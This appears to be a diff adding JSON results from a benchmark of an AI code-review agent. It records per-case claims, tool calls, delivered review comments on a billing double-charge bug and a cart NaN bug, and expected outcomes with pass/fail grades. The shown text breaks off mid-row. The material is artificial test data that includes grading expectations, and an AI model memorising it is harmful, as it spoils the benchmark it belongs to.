@@ -1,0 +1,2412 @@
+{
+  "model": "deepseek-v4-flash@fireworks",
+  "byokReasoning": "none",
+  "judge": "gemini-3-flash-preview",
+  "judgeReasoningEffort": null,
+  "reps": 5,
+  "engine": {
+    "commit": "7f04ea6a6bde3993a22103d32551e45f15da8e6b",
+    "sourceDigest": "0a23223ef4a5acb6fde41fe88aec59c301ae9aa21604bb9d3ce843ac289feeb2"
+  },
+  "startedAt": "2026-10-15T12:56:42.177Z",
+  "updatedAt": "2026-10-15T13:18:39.192Z",
+  "complete": true,
+  "selectedCases": [
+    "R3p-consequence-status-pending",
+    "R9-repeat-after-dev-rejected",
+    "R16-fixed-then-reintroduced",
+    "P28-retry-cap-next-run-now",
+    "P37-markup-strip-new-sinks"
+  ],
+  "casesSourceDigest": "641f30cbe775ffa638711b63b8c954fb7e5ec15e4e3139364cb03d762830b611",
+  "summary": {
+    "measured": 25,
+    "infra": 0,
+    "problems": {
+      "unverified-shipped (#2040)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "repeat-of-sent": {
+        "n": 15,
+        "violations": 0,
+        "rate": 0
+      },
+      "revision-unlinked (#2039/#2020)": {
+        "n": 4,
+        "violations": 1,
+        "rate": 0.25
+      },
+      "refuted-shipped (control)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "true-bug-missed (guard)": {
+        "n": 10,
+        "violations": 1,
+        "rate": 0.1
+      },
+      "index-reference (#2039)": {
+        "n": 20,
+        "violations": 0,
+        "rate": 0
+      }
+    },
+    "byCase": {
+      "R3p-consequence-status-pending · resubmit-double-charge [deliver_linked, proposed]": {
+        "pass": 3,
+        "n": 5,
+        "delivered": 4
+      },
+      "R9-repeat-after-dev-rejected · resubmit-repeat-after-rejection [not_deliver, proposed]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "R16-fixed-then-reintroduced · qty-default-reintroduced-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P28-retry-cap-next-run-now · cap-returns-now-repeat [not_deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 0
+      },
+      "P37-markup-strip-new-sinks · chat-inbox-markup-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      }
+    }
+  },
+  "rows": [
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R3p-consequence-status-pending",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 77591,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/status.ts",
+          "claim": "WHAT: Propagating NotReadyError unchanged from fetchStatus (lines 8-10) newly makes the NotReadyError branch in pollCharge (poller.ts:13-15) reachable, and that branch calls gw.submit(charge.payload) — a non-idempotent operation (gateway.ts:3). WHY: NotReadyError is documented in errors.ts:1 as 'the gateway has the charge but has not settled it yet (transient)', so a charge the gateway already accepted but has not settled now causes pollCharge to resubmit it, creating a duplicate charge / double billing. Before this PR the branch was dead because fetchStatus wrapped every error into FailedError. HOW: either treat NotReadyError as transient and do not resubmit (return a 'pending' state and retry on the next tick), or distinguish the two states with separate error types (e.g. NotReceivedError vs NotSettledError) so only the 'never received' case resubmits; do not resubmit on a merely-unsettled charge.",
+          "keep": true,
+          "rationale": "Verified: status.ts:8-10 now propagates NotReadyError unchanged; poller.ts:13-15 catches NotReadyError and calls gw.submit(charge.payload) (non-idempotent resubmit); errors.ts:1 documents NotReadyError as 'the gateway has the charge but has not settled it yet (transient)'. Before this change, fetchStatus wrapped all errors in FailedError, so the NotReadyError branch in pollCharge was unreachable. The change activates a path that resubmits an already-accepted charge, matching the claimed duplicate-charge failure. Note this is NOT a repeat of the prior decision (round-a-propagate), which only asked to propagate NotReadyError so callers could retry; this finding flags the distinct downstream consequence of that propagation (resubmit-on-unsettled). That said, the new finding is a direct consequence of applying the earlier suggestion, so it should reference/revise it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "pollCharge|NotReadyError|submit\\("
+              },
+              "failed": false
+            },
+            {
+              "name": "listDir",
+              "args": {
+                "path": "src/billing"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 19,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/status.ts",
+          "line": 8,
+          "severity": "critical",
+          "linkedById": true,
+          "revisesSuggestionId": "round-a-propagate",
+          "label": "bug",
+          "marked": false,
+          "text": "**Revises an earlier Kody suggestion** on `src/billing/status.ts:8` (2026-09-30 00:46 UTC).\n\nPropagating `NotReadyError` unchanged from `fetchStatus` (lines 8-10) makes the `NotReadyError` branch in `pollCharge` (`poller.ts:13-15`) reachable and call the non-idempotent `gw.submit(charge.payload)` (`gateway.ts:3`), so a charge the gateway already accepted but has not settled—per `errors.ts:1`—can be resubmitted and double-billed; previously this branch was dead because `fetchStatus` wrapped every error into `FailedError`. Treat `NotReadyError` as transient and do not resubmit (return a pending state and retry on the next tick), or use separate error types such as `NotReceivedError` and `NotSettledError` so only the never-received case resubmits and a merely-unsettled charge does not."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-double-charge",
+          "expect": "deliver_linked",
+          "proposed": true,
+          "truth": "true",
+          "delivered": true,
+          "linked": true,
+          "linkedById": true,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R3p-consequence-status-pending",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 51063,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/status.ts",
+          "claim": "WHAT: The new NotReadyError rethrow makes pollCharge's resubmit branch live for a charge the gateway already accepted, and that branch calls the non-idempotent gw.submit. WHY: pollCharge runs on every tick, so an accepted-but-unsettled charge will now trigger gw.submit(payload) repeatedly, and Gateway.submit is documented as 'NOT idempotent: every call creates a new charge' — producing duplicate charges (double billing) on each tick. HOW: gate the resubmit on the charge not having been accepted yet (or make the resubmit idempotent via an idempotency key) instead of resubmitting on every NotReadyError; e.g. in pollCharge only resubmit when the charge is known to be unsent, and otherwise just return a pending state for NotReadyError.",
+          "keep": true,
+          "rationale": "The claim is technically grounded in the current code. status.ts lines 8-11 now rethrow NotReadyError unchanged (the PreviousReviewDecision's requested change), and poller.ts lines 13-15 catch NotReadyError and call gw.submit(charge.payload), which gateway.ts line 3 explicitly documents as NOT idempotent ('every call creates a new charge'). The poller docstring says it is 'Called on every tick for charges the gateway has ACCEPTED', so a charge that is accepted-but-unsettled (NotReadyError) will cause a fresh, non-idempotent submit on every tick, producing duplicate charges. The failure path is live and concrete; nothing guards the resubmit on 'not yet submitted'. Note the finding is not a mere repeat of the earlier entry: that entry raised misclassification of transient errors as terminal (a wrong status), whereas this finding is the distinct double-billing consequence introduced by propagating NotReadyError into the resubmit branch. No refutation available.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts",
+                "startLine": 1,
+                "endLine": 120
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "pollCharge|NotReadyError|gw\\.submit|Gateway\\.submit"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "submit|idempotent|NotReadyError",
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 18,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/status.ts",
+          "line": 8,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "Because the new `NotReadyError` rethrow in `src/billing/status.ts` makes `pollCharge`'s resubmit branch live for a charge the gateway already accepted, and `pollCharge` runs on every tick, an accepted-but-unsettled charge will repeatedly call non-idempotent `gw.submit`; since `Gateway.submit` is documented as 'NOT idempotent: every call creates a new charge', this produces duplicate charges (double billing) on each tick. Gate the resubmit on the charge not having been accepted yet (or make it idempotent via an idempotency key) instead of resubmitting on every `NotReadyError`, so `pollCharge` only resubmits when the charge is known to be unsent and otherwise returns a pending state for `NotReadyError`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-double-charge",
+          "expect": "deliver_linked",
+          "proposed": true,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R3p-consequence-status-pending",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 64584,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/status.ts",
+          "claim": "WHAT: Propagating NotReadyError unchanged from fetchStatus now reaches pollCharge (src/billing/poller.ts:13), which treats NotReadyError as 'the gateway never received it' and calls gw.submit(charge.payload) — but errors.ts documents NotReadyError as 'the gateway HAS the charge but has not settled it yet (transient)', and gateway.ts:3 documents submit as NOT idempotent ('every call creates a new charge'). WHY: A charge that is merely not settled yet is now resubmitted, creating a duplicate charge on every poll tick until settlement, i.e. double billing. HOW: Distinguish the two cases — either stop resubmitting for a merely-not-settled status (treat it as a transient retry with no side effect, e.g. re-poll on the next tick without calling submit), or have the gateway raise a distinct error (e.g. NotReceivedError) for 'never received' so pollCharge resubmits only for that case.",
+          "keep": true,
+          "rationale": "All technical claims verified: status.ts:9 propagates NotReadyError unchanged; poller.ts:13-15 treats NotReadyError as 'never received' and calls gw.submit(charge.payload); errors.ts:1 documents NotReadyError as 'gateway HAS the charge but not settled yet'; gateway.ts:3 documents submit as NOT idempotent. The failure path (duplicate charge on each poll tick) is real and the root cause is factually correct. This is NOT a repeat of PreviousDecision round-a-propagate: that entry's failure was 'transient error misclassified as terminal, preventing retry.' This finding describes a DIFFERENT consequence arising from applying that suggestion — propagating NotReadyError now causes poller.ts to resubmit a charge the gateway already holds, producing duplicate charges. Different failure (double billing), and it is a consequence of the earlier applied suggestion, so it is a legitimate revision, not a re-raise.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 22,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/status.ts",
+          "line": 8,
+          "severity": "critical",
+          "linkedById": true,
+          "revisesSuggestionId": "round-a-propagate",
+          "label": "bug",
+          "marked": false,
+          "text": "**Revises an earlier Kody suggestion** on `src/billing/status.ts:8` (2026-09-30 00:46 UTC).\n\nPropagating `NotReadyError` unchanged from `fetchStatus` now reaches `pollCharge` (`src/billing/poller.ts:13`), which treats it as 'the gateway never received it' and calls `gw.submit(charge.payload)`; because `errors.ts` documents `NotReadyError` as 'the gateway HAS the charge but has not settled it yet' and `gateway.ts:3` documents `submit` as not idempotent ('every call creates a new charge'), this resubmits a merely unsettled charge on every poll tick until settlement, causing duplicate charges and double billing. Distinguish the two cases by either treating a merely-not-settled status as a transient retry that re-polls next tick without calling `submit`, or having the gateway raise a distinct error (e.g. `NotReceivedError`) for 'never received' so `pollCharge` resubmits only for that case."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-double-charge",
+          "expect": "deliver_linked",
+          "proposed": true,
+          "truth": "true",
+          "delivered": true,
+          "linked": true,
+          "linkedById": true,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R3p-consequence-status-pending",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 79302,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/status.ts",
+          "claim": "WHAT: The newly propagated NotReadyError reaches pollCharge, which treats every NotReadyError as \"the gateway never received it\" and calls gw.submit — but NotReadyError is also thrown for a charge the gateway already holds but has not settled (errors.ts:1, transient), and Gateway.submit is explicitly NOT idempotent (gateway.ts:3-4). WHY: Every poll tick where the charge is simply not settled yet now triggers gw.submit, creating a brand-new charge and double-charging the customer; under the previous code NotReadyError was wrapped in FailedError so this path was unreachable. HOW: Distinguish the two cases at the source — have gw.status throw a distinct error (e.g. PendingError) for \"not settled yet\" and reserve NotReadyError for \"not received\" (the only case that should resubmit) — or make submit idempotent via an idempotency key before allowing the retry.",
+          "keep": true,
+          "rationale": "Verified against source. errors.ts:1 documents NotReadyError as \"the gateway has the charge but has not settled it yet (transient)\", while poller.ts:5-14 comments assert NotReadyError means \"never received it\" and calls the explicitly non-idempotent gw.submit (gateway.ts:3-4) on every tick. The change in status.ts:8-10 propagates NotReadyError unchanged (previously wrapped in FailedError), which is exactly what activates this resubmit path. The technical claim is accurate. This is NOT a repeat of the previous decision round-a-propagate, which raised the opposite consequence (a transient error being misclassified as terminal failure) and proposed propagating the error. This finding is a consequence of applying that earlier suggestion — a different failure (double-charge vs. false-terminal) that reverses the earlier suggestion, so it is a legitimate revision, not a re-raise of the same problem.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError|pollCharge|submit\\("
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/billing/status.ts",
+          "claim": "WHAT: The new branch propagates NotReadyError unchanged, but the only caller pollCharge treats every NotReadyError as 'gateway never received it' and calls the non-idempotent gw.submit to resend, so a charge that is merely unsettled (the documented meaning of NotReadyError in errors.ts) is resubmitted and a duplicate charge is created on each poll tick. WHY: gateway.ts:3 states submit is NOT idempotent and every call creates a new charge, so propagating a transient settle error causes duplicate charges / double billing. HOW: distinguish 'never received' from 'not settled yet' — e.g. have gw.status throw a distinct error for the unsettled case, or only resubmit on the explicit never-received signal rather than on NotReadyError as a whole.",
+          "keep": true,
+          "rationale": "The technical claim is verified against the code: errors.ts:1 documents NotReadyError as \"the gateway has the charge but has not settled it yet (transient)\", while poller.ts:7 treats NotReadyError as \"the gateway never received it\" and calls gw.submit, which gateway.ts:3 documents as NOT idempotent (\"every call creates a new charge\"). The new status.ts:8-9 branch propagates NotReadyError, so pollCharge resubmits an unsettled charge — a real duplicate-charge path. This is a distinct failure (double billing from resubmission) from the one entry round-a-propagate raised (transient error reported as failed); it is the consequence of the caller's misinterpretation, not a re-raise of the misclassification problem. Entry #1's outcome is pending (not applied), and the candidate narrows/reverses its suggested fix, so it should be reported (as a revision) rather than dropped. Not refutable.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "pollCharge|NotReadyError|submit\\(|status\\(",
+                "excludeTests": true
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 23,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/status.ts",
+          "line": 8,
+          "severity": "critical",
+          "linkedById": true,
+          "revisesSuggestionId": "round-a-propagate",
+          "label": "bug",
+          "marked": false,
+          "text": "**Revises an earlier Kody suggestion** on `src/billing/status.ts:8` (2026-09-30 00:46 UTC).\n\nThe only caller `pollCharge` treats every `NotReadyError` as \"gateway never received it\" and resubmits via the non-idempotent `gw.submit`, so an unsettled charge (the meaning documented in errors.ts) is resubmitted and duplicated on each poll tick, causing double billing. Distinguish \"never received\" from \"not settled yet\" — have `gw.status` throw a distinct error for the unsettled case, or only resubmit on the explicit never-received signal."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/billing/status.ts",
+          "line": 8,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "`pollCharge` treats every propagated `NotReadyError` as \"gateway never received it\" and calls the non-idempotent `gw.submit` (gateway.ts:3-4), so each poll tick on a merely unsettled charge creates a new charge and double-charges the customer; previously `NotReadyError` was wrapped in `FailedError`, making this path unreachable. Distinguish the cases at the source by having `gw.status` throw a distinct `PendingError` for \"not settled yet\" and reserve `NotReadyError` for \"not received\", or make `submit` idempotent via an idempotency key before allowing the retry."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-double-charge",
+          "expect": "deliver_linked",
+          "proposed": true,
+          "truth": "true",
+          "delivered": true,
+          "linked": true,
+          "linkedById": true,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R3p-consequence-status-pending",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 54546,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/status.ts",
+          "claim": "WHAT: fetchStatus now rethrows NotReadyError unchanged, so the transient 'not settled yet' error reaches pollCharge's catch, which calls the non-idempotent gw.submit(charge.payload). WHY: errors.ts documents NotReadyError as 'the gateway HAS the charge but has not settled it yet (transient)', while gateway.ts documents submit as 'NOT idempotent: every call creates a new charge' — a charge that is merely pending will be resubmitted and a duplicate charge created on every poll tick (previously this branch was unreachable because NotReadyError was wrapped in FailedError). HOW: distinguish 'gateway never received it' from 'not settled yet' (e.g. a separate TransientPendingError, or return the pending state instead of throwing) so pollCharge only resubmits for a truly unknown charge.",
+          "keep": true,
+          "rationale": "The claim is factually accurate. fetchStatus (status.ts:8-10) rethrows NotReadyError unchanged; pollCharge (poller.ts:13-14) catches NotReadyError and calls the non-idempotent gw.submit(charge.payload). errors.ts documents NotReadyError as \"gateway HAS the charge but has not settled it yet (transient)\", while gateway.ts documents submit as \"NOT idempotent: every call creates a new charge\". So a merely-pending charge reaching the resubmit branch will create a duplicate charge each poll tick. Before this change NotReadyError was wrapped in FailedError, so this branch was unreachable — the diff activates it. This is a consequence of applying the earlier round-a-propagate suggestion (propagate NotReadyError unchanged), i.e. a different problem (duplicate charge / overbilling in the resubmit operation) than the misclassification that suggestion raised, so it is not a repeat. Keep.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError|pollCharge|gw\\.submit|FailedError",
+                "glob": "*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/status.ts",
+          "line": 8,
+          "label": "bug",
+          "earlierId": "round-a-propagate",
+          "earlierOutcome": "pending",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 16,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-double-charge",
+          "expect": "deliver_linked",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R9-repeat-after-dev-rejected",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 28134,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-after-rejection",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R9-repeat-after-dev-rejected",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 26541,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-after-rejection",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R9-repeat-after-dev-rejected",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 61914,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 11,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-after-rejection",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R9-repeat-after-dev-rejected",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 39914,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-after-rejection",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R9-repeat-after-dev-rejected",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 37026,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-after-rejection",
+          "expect": "not_deliver",
+          "proposed": true,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R16-fixed-then-reintroduced",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 52530,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/cart/total.ts",
+          "claim": "WHAT: `sum += item.price * item.qty` multiplies by `item.qty`, which is optional in `Item` (`qty?: number` in src/cart/types.ts), so an item without qty yields `price * undefined` = NaN. WHY: NaN propagates through `sum`, so total() returns NaN for the entire cart whenever any single item omits qty, breaking the numeric contract for every consumer. HOW: restore the default, e.g. `sum += item.price * (item.qty ?? 1);`.",
+          "keep": false,
+          "rationale": "The technical claim is correct (qty is optional and line 5 would yield NaN), but this is an exact repeat of PreviousDecision entry round-a-default-qty, which already reported the same failure — omitted qty causing a NaN total in the same total() operation — and proposed the identical fix (item.qty ?? 1). Rules require dropping findings that raise the problem a previous review entry already raised, regardless of that entry's Outcome or the fact that the applied fix is incomplete. No new evidence of a distinct bug; the failure, operation, and cause are the same.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/total.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/types.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 7,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "qty-default-reintroduced-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
